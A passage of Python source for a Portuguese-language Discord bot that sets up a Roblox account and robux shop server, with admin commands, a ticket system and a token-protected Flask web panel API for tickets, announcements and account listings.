            • Use `!criar_nova_loja CONFIRMAR` para criar estrutura nova
            • Ou use `!restaurar_backup {filename} confirmar` para reverter
            
            ⚠️ Este canal será deletado ao criar nova loja.
            """,
            color=COLORS["success"],
            timestamp=discord.utils.utcnow()
        )
        success_embed.set_footer(text=f"Executado por {ctx.author.display_name}")
        
        await temp_channel.send(embed=success_embed)
        logger.info(f"Clear void TOTAL executado por {ctx.author} ({ctx.author.id}) - {deleted_stats['members_banned']} membros banidos - Backup: {filename}")
        
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Erro durante limpeza",
            description=f"```{str(e)}```\n\nO backup foi salvo: `{filename}`",
            color=COLORS["error"]
        )
        try:
            await progress_msg.edit(embed=error_embed)
        except:
            pass
        logger.error(f"Erro no clear_void: {e}")


@bot.command(name="criar_nova_loja")
@commands.has_permissions(administrator=True)
async def criar_nova_loja(ctx, confirmar: str = None):
    """Cria uma loja profissional completa após clear_void"""
    
    # Aviso de segurança
    if confirmar != "CONFIRMAR":
        embed = discord.Embed(
            title="🏗️ Criar Nova Loja",
            description="""
            **Este comando irá:**
            ✅ Criar estrutura profissional completa
            ✅ Criar todos os cargos necessários
            ✅ Criar categorias organizadas
            ✅ Criar canais com permissões
            ✅ Configurar painéis automaticamente
            
            **Recomendado usar após `!clear_void`**
            
            Para confirmar, use:
            `!criar_nova_loja CONFIRMAR`
            """,
            color=COLORS["info"]
        )
        await ctx.send(embed=embed)
        return
    
    # Mensagem de progresso inicial
    progress_embed = discord.Embed(
        title="🏗️ Criando Nova Loja Profissional...",
        description="""
        **Progresso:**
        ⏳ Fase 1: Criando cargos...
        ⏸️ Fase 2: Criando estrutura...
        ⏸️ Fase 3: Configurando painéis...
        
        **⚠️ NÃO INTERROMPA O PROCESSO!**
        Isso pode levar alguns minutos...
        """,
        color=0xffa500
    )
    progress_msg = await ctx.send(embed=progress_embed)
    
    try:
        # Criar a loja
        results = await loja_builder.create_professional_shop(ctx.guild)
        
        # Atualizar com sucesso
        if results['success']:
            success_embed = discord.Embed(
                title="✅ Loja Criada com Sucesso!",
                description=f"""
                **🎉 Sua loja profissional está pronta!**
                
                📊 **Estatísticas:**
                📂 Categorias criadas: {results['created']['categories']}
                📝 Canais criados: {results['created']['channels']}
                📧 Mensagens/painéis: {results['created']['messages']}
                
                **📋 Estrutura criada:**
                
                📢 **INFORMAÇÕES**
                • 👋 boas-vindas
                • 📜 regras
                • 📢 anúncios
                • ℹ️ informações
                
                🛒 **LOJA**
                • 🎮 contas-roblox
                • 💎 robux
                • 🎫 passes-e-itens
                • 🔥 promoções
                
                💰 **ATENDIMENTO**
                • 📧 abrir-ticket (com painel)
                • ⭐ avaliações
                • ❓ dúvidas-frequentes
                
                💬 **COMUNIDADE**
                • 💭 chat-geral
                • 😂 memes
                • 📸 mídia
                • 🤝 parcerias
                • 🎤 Canais de voz
                
                🔧 **STAFF** (privado)
                • 📊 logs
                • 🤖 comandos
                • ⚙️ configuração
                
                **✨ Todos os painéis já estão configurados!**
                """,
                color=0x00ff00,
                timestamp=discord.utils.utcnow()
            )
            
            if results['errors']:
                error_list = "\n".join([f"• {err}" for err in results['errors'][:5]])
                success_embed.add_field(
                    name="⚠️ Avisos",
                    value=error_list,
                    inline=False
                )
            
            success_embed.add_field(
                name="💡 Próximos Passos",
                value="""
                1. Configure os IDs dos canais no `.env` se necessário
                2. Ajuste permissões dos cargos conforme sua equipe
                3. Comece a adicionar produtos pela aba "Contas" no painel web
                4. Se não gostar, use `!restaurar_backup <arquivo> confirmar`
                """,
                inline=False
            )
            
            success_embed.set_footer(text=f"Loja criada por {ctx.author.display_name}")
            await progress_msg.edit(embed=success_embed)
            
            logger.info(f"✅ Nova loja criada por {ctx.author} ({ctx.author.id})")
            
        else:
            # Erro na criação
            error_embed = discord.Embed(
                title="❌ Erro ao Criar Loja",
                description="Ocorreram erros durante a criação da loja.",
                color=0xff0000
            )
            
            error_list = "\n".join([f"• {err}" for err in results['errors'][:10]])
            error_embed.add_field(
                name="Erros Encontrados",
                value=f"```{error_list}```",
                inline=False
            )
            
            error_embed.add_field(
                name="🔄 Como Recuperar",
                value=f"Use: `{BOT_PREFIX}restaurar_backup <arquivo> confirmar`",
                inline=False
            )
            
            await progress_msg.edit(embed=error_embed)
            
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Erro Fatal",
            description=f"```{str(e)}```",
            color=0xff0000
        )
        error_embed.add_field(
            name="🔄 Como Recuperar",
            value=f"Use: `{BOT_PREFIX}restaurar_backup <arquivo> confirmar`",
            inline=False
        )
        await progress_msg.edit(embed=error_embed)
        logger.error(f"Erro fatal ao criar loja: {e}")


# ==================== SERVIR PAINEL WEB ====================

@app.route('/painel')
def painel():
    """Serve o painel web"""
    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            content = f.read()
            response = app.response_class(
                content,
                mimetype='text/html'
            )
            return response
    except FileNotFoundError:
        return "<h1>❌ Painel não encontrado</h1><p>O arquivo index.html não foi encontrado no servidor.</p>", 404

@app.route('/admin')
def admin():
    """Redireciona /admin para /painel"""
    return painel()

@app.route('/dashboard') 
def dashboard():
    """Redireciona /dashboard para /painel"""
    return painel()

# ==================== API ENDPOINTS PARA PAINEL ====================

@app.route('/api/bot/notify/<ticket_id>', methods=['POST'])
@require_api_token
def api_notify_staff(ticket_id):
    """API: Notifica staff sobre um ticket"""
    try:
        guild = bot_instance.get_guild(GUILD_ID)
        if not guild:
            return jsonify({'success': False, 'error': 'Servidor não encontrado'}), 404
        
        # Busca o canal do ticket
        channel_name = f"ticket-{ticket_id}"
        ticket_channel = discord.utils.get(guild.channels, name=channel_name)
        
        if not ticket_channel:
            return jsonify({'success': False, 'error': 'Canal do ticket não encontrado'}), 404
        
        # Executa de forma assíncrona
        async def send_notification():
            staff_roles = [guild.get_role(role_id) for role_id in STAFF_ROLE_IDS if guild.get_role(role_id)]
            staff_mentions = " ".join([role.mention for role in staff_roles])
            
            embed = discord.Embed(
                title="🔔 Notificação via Painel Web",
                description="A equipe foi notificada através do painel web!",
                color=COLORS["info"],
                timestamp=discord.utils.utcnow()
            )
            embed.add_field(name="📍 Canal", value=ticket_channel.mention, inline=False)
            embed.add_field(name="👤 Origem", value="Painel de Administração", inline=False)
            
            await ticket_channel.send(content=f"🚨 **ATENÇÃO EQUIPE!** {staff_mentions}", embed=embed)
        
        # Agenda a execução
        asyncio.create_task(send_notification())
        
        return jsonify({'success': True, 'message': f'Staff notificado sobre ticket #{ticket_id}'}), 200
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/bot/add-member/<ticket_id>', methods=['POST'])
@require_api_token
def api_add_member(ticket_id):
    """API: Adiciona membro a um ticket"""
    try:
        data = request.get_json()
        member_id = int(data.get('member_id'))
        
        guild = bot_instance.get_guild(GUILD_ID)
        if not guild:
            return jsonify({'success': False, 'error': 'Servidor não encontrado'}), 404
        
        member = guild.get_member(member_id)
        if not member:
            return jsonify({'success': False, 'error': 'Membro não encontrado'}), 404
        
        channel_name = f"ticket-{ticket_id}"
        ticket_channel = discord.utils.get(guild.channels, name=channel_name)
        
        if not ticket_channel:
            return jsonify({'success': False, 'error': 'Canal do ticket não encontrado'}), 404
        
        async def add_member():
            # Adiciona permissões
            overwrites = ticket_channel.overwrites
            overwrites[member] = discord.PermissionOverwrite(
                read_messages=True, send_messages=True, 
                read_message_history=True, attach_files=True
            )
            await ticket_channel.edit(overwrites=overwrites)
            
            # Notifica no canal
            embed = discord.Embed(
                title="➕ Membro Adicionado",
                description=f"{member.mention} foi adicionado via painel web!",
                color=COLORS["success"],
                timestamp=discord.utils.utcnow()
            )
            await ticket_channel.send(embed=embed)
        
        asyncio.create_task(add_member())
        
        return jsonify({'success': True, 'message': f'Membro {member.display_name} adicionado!'}), 200
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/bot/close/<ticket_id>', methods=['POST'])
@require_api_token
def api_close_ticket(ticket_id):
    """API: Fecha um ticket"""
    try:
        data = request.get_json()
        reason = data.get('reason', 'Fechado via painel web')
        staff_id = str(data.get('staff_id', 'panel_web'))
        
        guild = bot_instance.get_guild(GUILD_ID)
        if not guild:
            return jsonify({'success': False, 'error': 'Servidor não encontrado'}), 404
        
        channel_name = f"ticket-{ticket_id}"
        ticket_channel = discord.utils.get(guild.channels, name=channel_name)
        
        if not ticket_channel:
            return jsonify({'success': False, 'error': 'Canal do ticket não encontrado'}), 404
        
        async def close_ticket():
            logger.info(f"🔒 Fechando ticket #{ticket_id} via painel web")
            
            # Envia mensagem de fechamento
            embed = discord.Embed(
                title="🔒 Ticket Fechado",
                description="Este ticket foi fechado via painel web.",
                color=COLORS["error"],
                timestamp=discord.utils.utcnow()
            )
            embed.add_field(name="📝 Motivo", value=reason, inline=False)
            embed.add_field(name="⏰ Auto-exclusão", value="Canal será deletado em 10 segundos...", inline=False)
            
            await ticket_channel.send(embed=embed)
            
            # Fecha no gerenciador
            ticket_manager.close_ticket(ticket_id, reason, staff_id)
            logger.info(f"✅ Ticket #{ticket_id} fechado no gerenciador")
            
            # Deleta após 10 segundos
            await asyncio.sleep(10)
            await ticket_channel.delete(reason=f"Ticket fechado via painel: {reason}")
            logger.info(f"🗑️ Canal do ticket #{ticket_id} deletado")
        
        asyncio.create_task(close_ticket())
        
        return jsonify({'success': True, 'message': f'Ticket #{ticket_id} será fechado e deletado'}), 200
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/bot/tickets', methods=['GET'])
@require_api_token
def api_get_tickets():
    """API: Lista todos os tickets"""
    try:
        tickets = ticket_manager.get_all_tickets()
        return jsonify({'success': True, 'tickets': tickets}), 200
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ==================== ENDPOINTS PARA PAINEL WEB ====================

@app.route('/api/stats', methods=['GET'])
@require_api_token
def get_stats():
    """Retorna estatísticas dos tickets"""
    try:
        if not bot_instance:
            return jsonify({'success': False, 'error': 'Bot não conectado'}), 503
            
        # Força recarga dos tickets
        tickets = ticket_manager.get_all_tickets()
        
        # Debug: log dos tickets encontrados
        logger.info(f"📊 Estatísticas: {len(tickets)} tickets encontrados")
        
        total = len(tickets)
        open_tickets = len([t for t in tickets if t.get('status') == 'open'])
        closed_tickets = total - open_tickets
        open_percentage = round((open_tickets / total * 100) if total > 0 else 0)
        
        return jsonify({
            'success': True,
            'stats': {
                'total_tickets': total,
                'open_tickets': open_tickets,
                'closed_tickets': closed_tickets,
                'open_percentage': open_percentage
            }
        }), 200
    except Exception as e:
        logger.error(f"❌ Erro ao buscar estatísticas: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/logs', methods=['GET'])
@require_api_token
def get_logs_api():
    """Retorna logs recentes para o painel"""
    try:
        limit_param = request.args.get('limit', '200')
        level_filter = request.args.get('level')
        try:
            limit = max(1, min(int(limit_param), LOG_BUFFER_LIMIT))
        except ValueError:
            limit = 200
        logs_snapshot = list(log_buffer)
        if level_filter:
            level_filter = level_filter.upper()
            logs_snapshot = [log for log in logs_snapshot if log['level'] == level_filter]
        logs_payload = logs_snapshot[-limit:]
        return jsonify({'success': True, 'logs': logs_payload}), 200
    except Exception as e:
        logger.error(f"❌ Erro ao carregar logs para painel: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/tickets', methods=['GET'])
@require_api_token
def get_tickets():
    """Retorna todos os tickets"""
    try:
        tickets = ticket_manager.get_all_tickets()
        return jsonify({'success': True, 'tickets': tickets}), 200
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/ticket/<ticket_id>/notify', methods=['POST'])
@require_api_token
def notify_staff_panel(ticket_id):
    """Notifica staff via painel"""
    return api_notify_staff(ticket_id)

@app.route('/api/ticket/<ticket_id>/add-member', methods=['POST']) 
@require_api_token
def add_member_panel(ticket_id):
    """Adiciona membro via painel"""
    return api_add_member(ticket_id)

@app.route('/api/ticket/<ticket_id>/close', methods=['POST'])
@require_api_token
def close_ticket_panel(ticket_id):
    """Fecha ticket via painel"""
    return api_close_ticket(ticket_id)

@app.route('/api/tickets/reset', methods=['POST'])
@require_api_token
def reset_tickets():
    """Reset todos os tickets (apenas para debug)"""
    try:
        ticket_manager.tickets = {}
        ticket_manager.save_tickets()
        logger.info("🗑️ Todos os tickets foram resetados via API")
        return jsonify({'success': True, 'message': 'Todos os tickets foram resetados'}), 200
    except Exception as e:
        logger.error(f"❌ Erro ao resetar tickets: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/bot/restart', methods=['POST'])
@require_api_token
def restart_bot_endpoint():
    """Reseta tickets e agenda reinício completo do bot"""
    try:
        data = request.get_json(silent=True) or {}
        reset_flag = data.get('reset_tickets', True)
        requested_by = data.get('requested_by', 'painel_web')
        delay_value = data.get('delay', 4)
        try:
            delay = int(delay_value)
        except (TypeError, ValueError):
            delay = 4

        if reset_flag:
            ticket_manager.tickets = {}
            ticket_manager.save_tickets()
            logger.info(f"🧹 Tickets resetados antes do restart (solicitado por {requested_by})")

        schedule_bot_restart(delay)

        return jsonify({
            'success': True,
            'message': 'Bot será reiniciado em instantes. Painel ficará fora do ar temporariamente.'
        }), 200
    except Exception as e:
        logger.error(f"❌ Erro ao agendar restart: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/ticket/create', methods=['POST'])
@require_api_token
def create_ticket_panel():
    """Cria um novo ticket via painel"""
    try:
        data = request.get_json()
        user_id = data.get('user_id')
        reason = data.get('reason', 'Criado via painel web')
        
        if not user_id:
            return jsonify({'success': False, 'error': 'user_id é obrigatório'}), 400
        
        # Validar se é um ID numérico válido
        try:
            user_id = int(user_id)
        except ValueError:
            return jsonify({'success': False, 'error': 'user_id deve ser um número válido'}), 400
        
        # Criar o ticket
        async def create_ticket():
            guild = bot_instance.get_guild(GUILD_ID)
            if not guild:
                return False, "Servidor não encontrado"
            
            # Busca o usuário
            user = guild.get_member(user_id)
            if not user:
                return False, f"Usuário com ID {user_id} não encontrado no servidor"
            
            # Log antes de criar
            logger.info(f"🎫 Criando ticket via painel para {user.display_name} (ID: {user_id})")
            
            # Cria o ticket com canal real no Discord
            channel, result_msg = await create_ticket_channel(guild, user, reason)
            
            if channel:
                logger.info(f"✅ {result_msg} - Canal: {channel.name}")
                return True, f"{result_msg} - Canal: {channel.mention}"
            else:
                logger.error(f"❌ {result_msg}")
                return False, result_msg
        
        # Executa a função assíncrona no loop do bot
        try:
            loop = bot_instance.loop
            future = asyncio.run_coroutine_threadsafe(create_ticket(), loop)
            success, result = future.result(timeout=30)  # 30 segundos timeout
        except Exception as e:
            logger.error(f"❌ Erro ao executar função assíncrona: {e}")
            success, result = False, f"Erro interno: {str(e)}"
        
        if success:
            return jsonify({
                'success': True,
                'message': result
            }), 201
        else:
            return jsonify({'success': False, 'error': result}), 400
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ==================== ENDPOINTS DE ANÚNCIOS E CONTAS ====================

@app.route('/api/bot/announcement/send', methods=['POST'])
@require_api_token
def api_send_announcement():
    """API: Envia anúncio para o canal especificado"""
    try:
        data = request.get_json()
        message = data.get('message', '')
        
        if not message:
            return jsonify({'success': False, 'error': 'Mensagem é obrigatória'}), 400
        
        async def send_announcement():
            try:
                channel = bot_instance.get_channel(1443026662009606195)
                if not channel:
                    return False, "Canal de anúncios não encontrado"
                
                embed = discord.Embed(
                    title="📢 Anúncio Importante",
                    description=message,
                    color=COLORS["info"],
                    timestamp=discord.utils.utcnow()
                )
                embed.set_footer(text="Equipe de Administração")
                
                await channel.send(embed=embed)
                logger.info(f"📢 Anúncio enviado: {message[:50]}...")
                return True, "Anúncio enviado com sucesso!"
            except Exception as e:
                logger.error(f"❌ Erro ao enviar anúncio: {e}")
                return False, str(e)
        
        try:
            loop = bot_instance.loop
            future = asyncio.run_coroutine_threadsafe(send_announcement(), loop)
            success, result = future.result(timeout=10)
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)}), 500
        
        if success:
            return jsonify({'success': True, 'message': result}), 200
        else:
            return jsonify({'success': False, 'error': result}), 400
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/bot/account/post', methods=['POST'])
@require_api_token
def api_post_account():
    """API: Posta anúncio de conta no Discord"""
    try:
        data = request.get_json()
        
        required_fields = ['title', 'description', 'price', 'id']
        for field in required_fields:
            if field not in data:
                return jsonify({'success': False, 'error': f'{field} é obrigatório'}), 400
        
        async def post_account():
            try:
                channel = bot_instance.get_channel(1443026662009606195)
                if not channel:
                    return False, "Canal de anúncios não encontrado"
                
                embed = discord.Embed(
                    title=f"🎮 {data['title']}",
                    description=data['description'],
                    color=0x00ff00,
                    timestamp=discord.utils.utcnow()
                )
                embed.add_field(name="💰 Preço", value=data['price'], inline=True)
                
                if data.get('additional_info'):
                    embed.add_field(name="ℹ️ Informações Adicionais", value=data['additional_info'], inline=False)
                
                if data.get('image_url'):
                    embed.set_image(url=data['image_url'])
                
                embed.set_footer(text=f"ID: {data['id']}")
                
                # View com botão de compra - passa dados completos da conta
                account_data = {
                    'id': data['id'],
                    'title': data['title'],
                    'description': data['description'],
                    'price': data['price'],
                    'image_url': data.get('image_url', ''),
                    'info': data.get('additional_info', '')
                }
                view = BuyAccountView(data['id'], account_data)
                
                await channel.send(embed=embed, view=view)
                logger.info(f"🎮 Anúncio de conta postado: {data['title']}")
                return True, "Conta anunciada com sucesso!"
            except Exception as e:
                logger.error(f"❌ Erro ao postar conta: {e}")
                return False, str(e)
        
        try:
            loop = bot_instance.loop
            future = asyncio.run_coroutine_threadsafe(post_account(), loop)
            success, result = future.result(timeout=10)
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)}), 500
        
        if success:
            return jsonify({'success': True, 'message': result}), 200
        else:
            return jsonify({'success': False, 'error': result}), 400
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

def schedule_bot_restart(delay_seconds: int = 4):
    """Agenda reinício do processo do bot"""
    def _restart():
        try:
            logger.info(f"🔄 Reiniciando bot em {delay_seconds} segundos...")
            time.sleep(max(delay_seconds, 1))
            logger.info("🚀 Reiniciando processo do bot agora")
            os.execl(sys.executable, sys.executable, *sys.argv)
        except Exception as exc:
            logger.error(f"❌ Falha ao reiniciar bot: {exc}")
    threading.Thread(target=_restart, daemon=True).start()

def run_web_server():
    """Executa o servidor web em thread separada"""
    port = int(os.getenv('PORT', 8080))  # Render fornece PORT automaticamente
    app.run(host='0.0.0.0', port=port, debug=False)

# ==================== ERROR HANDLERS ====================

@bot.event
async def on_error(event, *args, **kwargs):
    """Handler para erros gerais"""
    logger.error(f"Erro no evento {event}", exc_info=True)

@bot.event
async def on_command_error(ctx, error):
    """Handler para erros de comandos"""
    if isinstance(error, commands.CommandNotFound):
        return  # Ignora comandos não encontrados
    
    logger.error(f"Erro no comando {ctx.command}: {error}", exc_info=True)
    
    try:
        await ctx.send(f"❌ Ocorreu um erro: {str(error)}")
    except:
        pass  # Se não conseguir enviar mensagem, ignora

# ==================== MAIN ====================

def main():
    """Função principal para executar o bot com auto-restart e API"""
    global bot_instance
    
    if not BOT_TOKEN or BOT_TOKEN == "seu_token_aqui":
        print("❌ ERRO: BOT_TOKEN não configurado!")
        print("Configure o arquivo .env com seu token do Discord")
        return
    
    # Validar apenas GUILD_ID e STAFF_ROLE_IDS (necessários antes de auto-detecção)
    if GUILD_ID == 0:
        print("❌ ERRO: GUILD_ID não definido!")
        print("Configure o arquivo .env com o ID do servidor Discord")
        return
    
    if not STAFF_ROLE_IDS or STAFF_ROLE_IDS == [0]:
        print("⚠️ AVISO: STAFF_ROLE_IDS não configurado!")
        print("Configure no .env para permitir que staff feche tickets")
    
    # IDs de canais não são mais obrigatórios - sistema de auto-detecção irá encontrá-los
    if TICKET_CHANNEL_ID == 0 or LOG_CHANNEL_ID == 0:
        print("ℹ️ IDs de canais não configurados - usando sistema de auto-detecção")
    
    print("🚀 Iniciando bot iBot...")
    print("🌐 Iniciando servidor web com painel integrado na porta 8080...")
    
    # Inicia servidor web em thread separada
    web_thread = threading.Thread(target=run_web_server, daemon=True)
    web_thread.start()
    
    # Loop de auto-restart em caso de erro
    while True:
        try:
            bot_instance = bot  # Disponibiliza bot para API
            bot.run(BOT_TOKEN)
        except KeyboardInterrupt:
            print("\n⚠️ Bot encerrado pelo usuário")
            break
        except Exception as e:
            logger.error(f"❌ Bot crashou: {e}", exc_info=True)
            print(f"⚠️ Bot crashou! Reiniciando em 5 segundos...")
            import time
            time.sleep(5)
            print("🔄 Reiniciando bot...")


if __name__ == "__main__":
    main()
